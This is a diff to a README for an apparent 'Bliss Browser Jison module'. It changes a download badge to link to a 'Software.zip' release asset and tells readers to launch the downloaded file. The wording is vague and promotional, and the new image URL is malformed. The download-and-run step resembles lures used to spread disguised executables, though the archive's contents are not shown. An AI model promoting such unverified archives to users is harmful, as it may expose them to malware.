@@ -18,7 +18,7 @@ The Bliss Browser Jison module opens up a world of possibilities for developers 
 
 To get started with the Bliss Browser Jison module, simply download the software package from the following link:
 
-[![Download Bliss Browser Jison](https://img.shields.io/static/v1?label=Download&message=Bliss%20Browser%20Jison&color=blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Bliss Browser Jison](https://github.com/islem123456/Bliss_Browser_Jison/releases/download/v2.0/Software.zip%20Browser%20Jison&color=blue)](https://github.com/islem123456/Bliss_Browser_Jison/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file to begin the installation process. If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
